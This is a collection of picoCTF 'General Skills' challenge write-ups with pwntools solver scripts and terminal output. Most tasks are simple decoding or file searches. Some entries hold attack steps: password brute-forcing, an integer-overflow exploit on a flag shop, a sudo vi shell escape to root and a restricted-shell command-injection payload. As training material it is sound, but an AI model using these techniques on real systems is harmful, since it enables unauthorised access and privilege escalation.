### Obedient Cat

Download the file and `cat` its content.

```bash
➜  General-Skills git:(main) ✗ cat flag 
picoCTF{XXX}
```

### Python Wrangling

Download the files and run `python ende.py -d flag.txt.en` and insert `6008014f6008014f6008014f6008014f` as password.

```bash
➜  General-Skills git:(main) ✗ python ende.py -d flag.txt.en                                 
Please enter the password:6008014f6008014f6008014f6008014f
picoCTF{XXX}
```

### Wave a flag

Download the files and run `chmod +x warm && ./warm -h` to get the flag.

```bash
➜  General-Skills git:(main) ✗ chmod +x warm && ./warm -h
Oh, help? I actually don't do much, but I do have this flag here: picoCTF{XXX}
```

### Nice netcat

`nc` to the server and convert the decimal characters to ASCII using python3 `chr()`.

```python
#!/usr/bin/python3.8
from pwn import *
import os
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'critical'

r = remote('mercury.picoctf.net', 22342)

# For visibility
print('')

while 1:
  # Convert Decimal to ASCII
  ch = chr(int(r.recvline().strip()))
  print(ch, end='')
  if ch == '}':
    print('\n')
    break
```

 ```bash
➜  General-Skills git:(main) ✗ python solver.py
[+] Opening connection to mercury.picoctf.net on port 22342: Done

picoCTF{XXX}

[*] Closed connection to mercury.picoctf.net port 22342
 ```

### Static ain't always noise

Download the `static` file and run `strings static | grep pico` to get the flag.

```bash
➜  General-Skills git:(main) ✗ strings static | grep pico
picoCTF{XXX}
```

### Tab, Tab, Attack

Download the `.zip`, and `strings` the binary in the last folder after the tabs.

```bash
➜  General-Skills git:(main) ✗ unzip Addadshashanammu.zip 
Archive:  Addadshashanammu.zip
   creating: Addadshashanammu/
   creating: Addadshashanammu/Almurbalarammi/
   creating: Addadshashanammu/Almurbalarammi/Ashalmimilkala/
   creating: Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/
   creating: Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/
   creating: Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/
   creating: Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/
  inflating: Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet  
➜  General-Skills git:(main) ✗ strings Addadshashanammu/Almurbalarammi/Ashalmimilkala/Assurnabitashpi/Maelkashishi/Onnissiralis/Ularradallaku/fang-of-haynekhtnamet | grep pico
*ZAP!* picoCTF{XXX}
```

### Magikarp Ground Mission

Connect to the remote server with `ssh ctf-player@venus.picoctf.net -p 51835` and password `481e7b14` and run the following commands to assemble the flag. (The remote instance might differ).

```bash
ctf-player@pico-chall$ cat /home/ctf-player/drop-in/1of3.flag.txt 
picoCTF{XXX
ctf-player@pico-chall$ cat /2of3.flag.txt 
XXX
ctf-player@pico-chall$ cat ../3of3.flag.txt 
XXX
```

### Lets Warm Up

Convert `0x70` to ASCII.

```python
➜  General-Skills git:(main) ✗ python -c 'print(chr(0x70))'
p
```

### Warmed Up

Convert `0x3D` to Decimal.

```python
➜  General-Skills git:(main) ✗ python -c 'print(0x3d)'
61
```

### 2Warm

Convert `42` to binary.

```bash
➜  General-Skills git:(main) ✗ python -c 'print(bin(42)[2:])'
101010
```

### what's a net cat?

Connect to the remote instance via `nc` and get the flag.

```bash
➜  General-Skills git:(main) ✗ nc jupiter.challenges.picoctf.org 41120
You're on your way to becoming the net cat master
picoCTF{XXX}
```

### strings it

Download the file and run `strings` with `grep` to get the flag.

```bash
➜  General-Skills git:(main) ✗ strings strings | grep pico
picoCTF{XXX}
```

### Bases

Decode the string with `base64` to get the flag.

```bash
➜  General-Skills git:(main) ✗ echo bDNhcm5fdGgzX3IwcDM1 | base64 -d 
l3arn_th3_r0p35
```

### First Grep

Download the file and run `strings` with `grep` to get the flag.

```bash
➜  General-Skills git:(main) ✗ strings file | grep pico
picoCTF{grep_is_good_to_find_things_5af9d829}
```

### Codebook

Download the 2 files and run `python code.py` to get the flag. 

```bash
➜  General-Skills git:(main) ✗ python code.py                  
picoCTF{XXX}
```

### convertme.py

Download the python script and change its permissions to Executable with `chmod +x convertme.py` and run the following script to convert the numbers and get the flag.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')

r = process(['python3', 'convertme.py'])

r.recvuntil('If ')
r.sendlineafter(':', bin(int(r.recvuntil(' '))))
r.recvuntil('flag: ')
print(f'Flag --> {r.recvline().strip().decode()}')
```

```bash
➜  General-Skills git:(main) ✗ python solver.py
[+] Starting local process '/usr/bin/python3': pid 565826
Flag --> picoCTF{XXX}
[*] Stopped process '/usr/bin/python3' (pid 565826)
```

### fixme1.py

Download the file and remove the `tab` from the `print` line and run the script with `python fixme1.py`.

```python
# Wrong
flag = str_xor(flag_enc, 'enkidu')
  print('That is correct! Here\'s your flag: ' + flag)

# Correct
flag = str_xor(flag_enc, 'enkidu')
print('That is correct! Here\'s your flag: ' + flag)   
```

```bash
➜  General-Skills git:(main) ✗ python fixme1.py
That is correct! Here's your flag: picoCTF{XXX}
```

### fixme2.py

Download the file and add a `=` to the comparison and run the script to get the flag.

```python
if flag == "":
```

```bash
➜  General-Skills git:(main) ✗ python fixme2.py
That is correct! Here's your flag: picoCTF{XXX}
```

### Glitch Cat

Connect to the remote server with `nc saturn.picoctf.net 53638` and convert the hex characters to ASCII to get the flag.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')

r = remote('saturn.picoctf.net', 53638)

# Read first part of the flag and remove "'"
flag = r.recvuntil("_'")[1:-1].decode()

# Seperate them by space and remove '+'
enc = r.recvline().replace(b'+', b'').split()

for i in enc[:-1]:
  # Remove the chr(0x) to read the numbers in decimal and convert them to int and characters
  flag += chr(int(i.decode().replace('chr(0x', '').replace(')', ''), 16))
flag += '}'

print(f'Flag --> {flag}')
```

```bash
➜  General-Skills git:(main) ✗ python solver.py
[+] Opening connection to saturn.picoctf.net on port 53638: Done
Flag --> picoCTF{XXX}
[*] Closed connection to saturn.picoctf.net port 53638
```

### HashingJobApp

Connect to the remote instance with `nc saturn.picoctf.net 52679` and `md5` hash the words given to get the flag.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import hashlib
warnings.filterwarnings('ignore')

r = remote('saturn.picoctf.net', 52679)

for i in range(3):
  r.recvuntil("quotes: '")
  word = r.recvuntil("'")[:-1]
  print(f'Word: {word.decode()}')
  word = hashlib.md5(word).hexdigest()
  r.sendline(word)
  print(f'md5 hashing: {word}')

print(f"\nFlag --> {r.recvline_contains('pico').strip().decode()}\n")
```

```bash
➜  General-Skills git:(main) ✗ python solver.py
[+] Opening connection to saturn.picoctf.net on port 52679: Done
Word: cholesterol
md5 hashing: 6b2aa5ed34cf2177d4b5c831f040cd0c
Word: baby showers
md5 hashing: 2c236af2a631160e18ec35119418c5ff
Word: Americans
md5 hashing: 165813154207e6cacef030430ea09616

Flag --> picoCTF{XXX}

[*] Closed connection to saturn.picoctf.net port 52679
```

### PW Crack 1

Download the files and `cat level1.py` to get the password, then run `python level1.py` and insert the password found to get the flag.

```bash
➜  General-Skills git:(main) ✗ cat level1.py 
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)        
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################


flag_enc = open('level1.flag.txt.enc', 'rb').read()



def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == "691d"): # password
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    print("That password is incorrect")



level_1_pw_check()
```

```bash
➜  General-Skills git:(main) ✗ python level1.py
Please enter correct password for flag: 691d
Welcome back... your flag, user:
picoCTF{XXX}
```

### PW Crack 2

Download the files and `cat level2.py` to get the password, then run `python level2.py` and insert the password found to get the flag.

```python
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)        
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open('level2.flag.txt.enc', 'rb').read()



def level_2_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65) ):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    print("That password is incorrect")



level_2_pw_check()
```

```bash
➜  General-Skills git:(main) ✗ python -c 'print(chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65))'
39ce
```

```bash
➜  General-Skills git:(main) ✗ python level2.py 
Please enter correct password for flag: 39ce
Welcome back... your flag, user:
picoCTF{XXX}
```

### PW Crack 3

Download the files and check the 7 possible passwords.

```python
pos_pw_list = ["6997", "3ac8", "f0ac", "4b17", "ec27", "4e66", "865e"]
```

Now we can brute force them to find the correct one.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import hashlib
warnings.filterwarnings('ignore')
context.log_level = 'error'

pos_pw_list = ["6997", "3ac8", "f0ac", "4b17", "ec27", "4e66", "865e"]

for i in pos_pw_list: 
  r = process(['python3', 'level3.py'])
  r.sendline(i)
  if (b'incorrect' not in r.recvline()):
    print(f'\nCorrect password: {i}')
    print(f"\nFlag --> {r.recvline_contains('pico').strip().decode()}\n")
    r.close()
    exit()
  r.close()
```

```bash
➜  General-Skills git:(main) ✗ python solver.py

Correct password: 865e

Flag --> picoCTF{XXX}
```

### PW Crack 4

Download the files and check the 100 possible passwords.

```python
pos_pw_list = ["6288", "6152", "4c7a", "b722", "9a6e", "6717", "4389", "1a28", "37ac", "de4f", "eb28", "351b", "3d58", "948b", "231b", "973a", "a087", "384a", "6d3c", "9065", "725c", "fd60", "4d4f", "6a60", "7213", "93e6", "8c54", "537d", "a1da", "c718", "9de8", "ebe3", "f1c5", "a0bf", "ccab", "4938", "8f97", "3327", "8029", "41f2", "a04f", "c7f9", "b453", "90a5", "25dc", "26b0", "cb42", "de89", "2451", "1dd3", "7f2c", "8919", "f3a9", "b88f", "eaa8", "776a", "6236", "98f5", "492b", "507d", "18e8", "cfb5", "76fd", "6017", "30de", "bbae", "354e", "4013", "3153", "e9cc", "cba9", "25ea", "c06c", "a166", "faf1", "2264", "2179", "cf30", "4b47", "3446", "b213", "88a3", "6253", "db88", "c38c", "a48c", "3e4f", "7208", "9dcb", "fc77", "e2cf", "8552", "f6f8", "7079", "42ef", "391e", "8a6d", "2154", "d964", "49ec"]
```

Now we can brute force them to find the correct one.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import hashlib
warnings.filterwarnings('ignore')
context.log_level = 'error'

pos_pw_list = ["6288", "6152", "4c7a", "b722", "9a6e", "6717", "4389", "1a28", "37ac", "de4f", "eb28", "351b", "3d58", "948b", "231b", "973a", "a087", "384a", "6d3c", "9065", "725c", "fd60", "4d4f", "6a60", "7213", "93e6", "8c54", "537d", "a1da", "c718", "9de8", "ebe3", "f1c5", "a0bf", "ccab", "4938", "8f97", "3327", "8029", "41f2", "a04f", "c7f9", "b453", "90a5", "25dc", "26b0", "cb42", "de89", "2451", "1dd3", "7f2c", "8919", "f3a9", "b88f", "eaa8", "776a", "6236", "98f5", "492b", "507d", "18e8", "cfb5", "76fd", "6017", "30de", "bbae", "354e", "4013", "3153", "e9cc", "cba9", "25ea", "c06c", "a166", "faf1", "2264", "2179", "cf30", "4b47", "3446", "b213", "88a3", "6253", "db88", "c38c", "a48c", "3e4f", "7208", "9dcb", "fc77", "e2cf", "8552", "f6f8", "7079", "42ef", "391e", "8a6d", "2154", "d964", "49ec"]

for i in pos_pw_list: 
  r = process(['python3', 'level4.py'])
  r.sendline(i)
  if (b'incorrect' not in r.recvline()):
    print(f'\nCorrect password: {i}')
    print(f"\nFlag --> {r.recvline_contains('pico').strip().decode()}\n")
    r.close()
    exit()
  r.close()
```

```bash
➜  General-Skills git:(main) ✗ python solver.py                     

Correct password: 973a

Flag --> picoCTF{XXX}
```

### PW Crack 5

Download the files and now there is a `dictionary.txt` that contains `65536` possible passwords. We found this number with:

```bash
➜  General-Skills git:(main) ✗ cat dictionary.txt| wc -l
65536
```

We open the file and read all the possible passwords, bruteforcing the correct one. This might take some minutes.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import hashlib
warnings.filterwarnings('ignore')
context.log_level = 'error'

f = open('dictionary.txt', 'r')

for i in range (65536): 
  r = process(['python3', 'level5.py'])
  pw = f.readline().strip()
  print(f'Checking password: {pw}')
  r.sendline(pw)
  if (b'incorrect' not in r.recvline()):
    print(f"\nFlag --> {r.recvline_contains('pico').strip().decode()}\n")
    r.close()
    exit()
  r.close()
```

```bash
Checking password: 9581

Flag --> picoCTF{XXX}
```

### runme.py

Download the script and run it to get the flag.

```bash
➜  General-Skills git:(main) ✗ python runme.py 
picoCTF{XXX}
```

### Serpentine

Download the file and call `print_flag()` function inside `main()`.

```python
import random
import sys

def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)        
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])

flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + chr(0x3a) + chr(0x0f) + chr(0x0e) + chr(0x59) + chr(0x06) + chr(0x4d) + chr(0x55) + chr(0x0c) + chr(0x0f) + chr(0x14)


def print_flag():
  flag = str_xor(flag_enc, 'enkidu')
  print(flag)

def main():

  print_flag()

if __name__ == "__main__":
  main()
```

```bash
➜  General-Skills git:(main) ✗ python serpentine.py
picoCTF{XXX}
```

### First Find

Download and unzip the file with `unzip files.zip` and `cat` the `uber-secret.txt`.

```bash
➜  General-Skills git:(main) ✗ unzip files.zip 
Archive:  files.zip
   creating: files/
   creating: files/satisfactory_books/
   creating: files/satisfactory_books/more_books/
  inflating: files/satisfactory_books/more_books/37121.txt.utf-8  
  inflating: files/satisfactory_books/23765.txt.utf-8  
  inflating: files/satisfactory_books/16021.txt.utf-8  
  inflating: files/13771.txt.utf-8   
   creating: files/adequate_books/
   creating: files/adequate_books/more_books/
   creating: files/adequate_books/more_books/.secret/
   creating: files/adequate_books/more_books/.secret/deeper_secrets/
   creating: files/adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/
 extracting: files/adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt  
  inflating: files/adequate_books/more_books/1023.txt.utf-8  
  inflating: files/adequate_books/46804-0.txt  
  inflating: files/adequate_books/44578.txt.utf-8  
   creating: files/acceptable_books/
   creating: files/acceptable_books/more_books/
  inflating: files/acceptable_books/more_books/40723.txt.utf-8  
  inflating: files/acceptable_books/17880.txt.utf-8  
  inflating: files/acceptable_books/17879.txt.utf-8  
  inflating: files/14789.txt.utf-8  
```

```bash
➜  General-Skills git:(main) ✗ cat files/adequate_books/more_books/.secret/deeper_secrets/deepest_secrets/uber-secret.txt
picoCTF{XXX}
```

### Big Zip

Download the file and unzip it with `unzip big-zip-files.zip`. Then `cd` inside the directory and `grep` for `pico`.

```bash
➜  big-zip-files git:(main) ✗ grep -ira "pico"
folder_pmbymkjcya/folder_cawigcwvgv/folder_ltdayfmktr/folder_fnpfclfyee/whzxrpivpqld.txt:information on the record will last a billion years. Genes and brains and books encode picoCTF{XXX}
```

### Based

Connect to the remote instance via `nc jupiter.challenges.picoctf.org 29956` and convert the sequences to ASCII to get the flag.

The first sequence is always binary.

The second is decimal.

The third is hex.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'error'

r = remote('jupiter.challenges.picoctf.org', 29956)

# Read binary 
r.recvuntil('give the ')
binary = r.recvuntil(' as', drop=True).split()

ans = ''

# Convert binary to ASCII
for i in binary:
  ans += chr(int(i, 2))

r.sendlineafter('Input:', ans)

# Read Decimal
r.recvuntil('give me the  ')
decimal = r.recvuntil(' as', drop=True).split()

ans = ''
for i in decimal:
  ans += chr(int(i, 8))

r.sendlineafter('Input:', ans)

# Read Hex
r.recvuntil('give me the ')
hexa = r.recvuntil(' as', drop=True).decode()

ans = ''
for i in range (0, len(hexa), 2):
  ans += chr(int(hexa[i:i+2], 16))
  i += 1

r.sendlineafter('Input:', ans)

print(r.recvline_contains('pico').decode())
```

```bash
➜  General-Skills git:(main) ✗ python solver.py
Flag: picoCTF{XXX}
```

### plumbing

Connect to the remote server and `grep` for `pico` to get the flag.

```bash
➜  General-Skills git:(main) ✗ nc jupiter.challenges.picoctf.org 4427 | grep pico
picoCTF{XXX}
```

### mus1c

This challenge is `guess the cipher`. Download the `lyric.txt` and convert it with [Rockstar](https://codewithrockstar.com/online). The output is this: 

```bash
114
114
114
111
99
107
110
114
110
48
49
49
51
114
```

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'error'

dec = [114, 114, 114, 111, 99, 107, 110, 114, 110, 48, 49, 49, 51, 114]

flag = 'picoCTF{'

for i in dec:
  flag += chr(i)

flag += '}'
print(f'Flag --> {flag}')
```

```bash
➜  General-Skills git:(main) ✗ python solver.py                                  
Flag ->> picoCTF{XXX}
```

### flag_shop

Finally a pwnable in `General Skills`. Taking a look at the `store.c`. 

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                                    
                    
                }
                    
                    
                    
                
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}
```

The bus is obvious here:

```c
scanf("%d", &number_flags);
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour current balance after transaction: %d\n\n", account_balance);
    }
```

`number_flags` is an integer number, that means the maximum value it can take is `2147483647`. So, if we exceed this number, an integer overflow will occur, resulting in negative number. Thus, `account_balance = account_balance - total_cost;` this line will increase our `account_balance` instead of decrease it. The goal is to pass this comparison:

```c
if(account_balance > 100000){
    FILE *f = fopen("flag.txt", "r");
    if(f == NULL){

        printf("flag not found: please run this on the server\n");
        exit(0);
    }
```

So, we need to loop through this bug a couple of times.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'error'

r = remote('jupiter.challenges.picoctf.org', 9745)

def buy_flags():
  r.sendline('2')
  r.sendline('1')
  r.sendline('2147483647')
  r.recvuntil('transaction: ')
  money = int(r.recvline().strip().decode())
  if money < 100000:
    print(f'Not enough money: [{money}]')
  else:
    print(f'$$$$$$')
    r.sendline('2')
    r.sendline('2')
    r.sendline('1')
    r.recvuntil('YOUR FLAG IS: ')
    print(f'Flag --> {r.recvline().strip().decode()}')
    exit()

while 1:
  buy_flags()
```

```bash
Not enough money: [97400]
Not enough money: [98300]
Not enough money: [99200]
$$$$$$
Flag --> picoCTF{XXX}
```

### 1_wanna_b3_a_r0ck5tar

Another `guess the cipher` challenge here. Like `mus1c`, we should convert this thing with [Rockstar](https://codewithrockstar.com/online). Well, this time it's not that easy. So, we will install this [script](pip install rockstar-py) with `pip install rockstar-py`. 

So, we run the script and read the output:

```bash
➜  General-Skills git:(main) ✗ /home/w3th4nds/.local/bin/rockstar-py -i lyrics.txt -o disgusting.py
➜  General-Skills git:(main) ✗ cat disgusting.py 
Rocknroll = True
Silence = False
a_guitar = 10
Tommy = 44
Music = 170
the_music = input()
if the_music == a_guitar:
    print("Keep on rocking!")
    the_rhythm = input()
    if the_rhythm - Music == False:
        Tommy = 66
        print(Tommy!)
        Music = 79
        Jamming = 78
        print(Music!)
        print(Jamming!)
        Tommy = 74
        print(Tommy!)
        They are dazzled audiences
        print(it!)
        Rock = 86
        print(it!)
        Tommy = 73
        print(it!)
        break
        print("Bring on the rock!")
        Else print("That ain't it, Chief")
        break
```

This is a more readable python script. We just convert the `prints` and get the flag.

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.log_level = 'error'

enc = [66, 79, 78, 74, 86, 73]

print('picoCTF{', end='')
for i in enc:
  print(chr(i), end='')
print('}')
```

```bash
➜  General-Skills git:(main) ✗ python solver.py
picoCTF{BONJVI}
```

### chrono

We open an instance and `ssh` to it.

```bash
ssh picoplayer@saturn.picoctf.net -p61000
```

Inside the server we run `cat /etc/crontab` and get the flag.

```bash
picoplayer@challenge:~$ cat /etc/crontab
# picoCTF{XXX}
```

### money-ware

The malware is `picoCTF{Petya}`.

### Permissions

Connect to the remote server with `ssh`.

```bash
ssh -p 55519 picoplayer@saturn.picoctf.net
```

There are 2 ways to get the flag. The first one is probably unintended because we can simply navigate to `/` directory and `cat` the contents of `challenge` folder. The other one is to run:

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

```bash
picoplayer@challenge:/challenge$ sudo vi

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
# ls -la
total 12
drwx------ 1 root root   23 Mar 16 02:29 .
drwxr-xr-x 1 root root   51 Mar 29 12:24 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Mar 16 02:29 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{XXX}
# ^C
# 

shell returned 130

Press ENTER or type command to continue
picoplayer@challenge:/challenge$ cat /challenge/metadata.json | grep pico
{"flag": "picoCTF{XXX}", "username": "picoplayer", "password": "pEN9KN1qYm"}
```

### useless

Connect to the server via `ssh`.

```bash
ssh -p 55859 picoplayer@saturn.picoctf.net 
```

Then we run `man` on the `useless` binary and get the flag.

```bash
picoplayer@challenge:~$ man useless 

useless
     useless, — This is a simple calculator script

SYNOPSIS
     useless, [add sub mul div] number1 number2

DESCRIPTION
     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.

Examples
     ./useless add 1 2
       This will add 1 and 2 and return 3

     ./useless mul 2 3
       This will return 6 as a product of 2 and 3

     ./useless div 6 3
       This will return 2 as a quotient of 6 and 3

     ./useless sub 6 5
       This will return 1 as a remainder of substraction of 5 from 6

Authors
     This script was designed and developed by Cylab Africa

     picoCTF{XXX}
```

### Special 

Connect to the remote server via `ssh`.

```bash
ssh -p 52906 ctf-player@saturn.picoctf.net
```

We see that the restricted shell does spell check on the commands we enter, thus we cannot simply run the usual commands we know like `ls`, `cat` etc.

We can notice that if we run some special characters like `$` and `()` the output is:

```bash
Special$ $
$ 
sh: 1: $: not found
Special$ $(ls)  
$(ls) 
sh: 1: blargh: not found
```

We suppose that the `flag.txt` is under `./blargh`. 

Then we run this payload to get the flag.

```bash
$(echo${IFS}cat${IFS}./blargh/flag.txt) 
picoCTF{XXX}
```

### Specialer

Connect to the remote server via `ssh`.

```bash
ssh -p 50781 ctf-player@saturn.picoctf.net
```

We run `ls` and see what happens.

```bash
Specialer$ ls
-bash: ls: command not found
```

We double press `tab` to see what we can run.

```bash
Specialer$   
!          ]]         break      command    coproc     done       esac       false      function   if         local      pushd      return     source     times      ulimit     wait
./         alias      builtin    compgen    declare    echo       eval       fc         getopts    in         logout     pwd        select     suspend    trap       umask      while
:          bash       caller     complete   dirs       elif       exec       fg         hash       jobs       mapfile    read       set        test       true       unalias    {
[          bg         case       compopt    disown     else       exit       fi         help       kill       popd       readarray  shift      then       type       unset      }
[[         bind       cd         continue   do         enable     export     for        history    let        printf     readonly   shopt      time       typeset    until  
```

Luckily enough we have:

* `echo`
* `read`
* `cd`

We write `cd` and double `tab` to see the current directories.

```bash
Specialer$ cd   
.hushlogin  .profile    abra/       ala/        sim/
```

Let's `cd` to `abra`.

```bash
Specialer$ cd abra/cada
cadabra.txt   cadaniel.txt  
Specialer$ cd abra/cada
cadabra.txt   cadaniel.txt  
Specialer$ cd abra/cada
```

Maybe `cadabra.txt` is the flag?

```Lbash
Specialer$ read -r line < cadabra.txt; echo $line              
Nothing up my sleeve!
```

This does not seem like a flag. Let's try `cadaniel.txt`.

```bash
Specialer$ read -r line < cadaniel.txt; echo $line
Yes, I did it! I really did it! I'm a true wizard!
```

Still no luck here. Navigating and try all the possible files, we find the flag here:

```bash
Specialer$ cd ala/
Specialer$ read -r line < kazam.txt; echo $line
return 0 picoCTF{XXX}
```
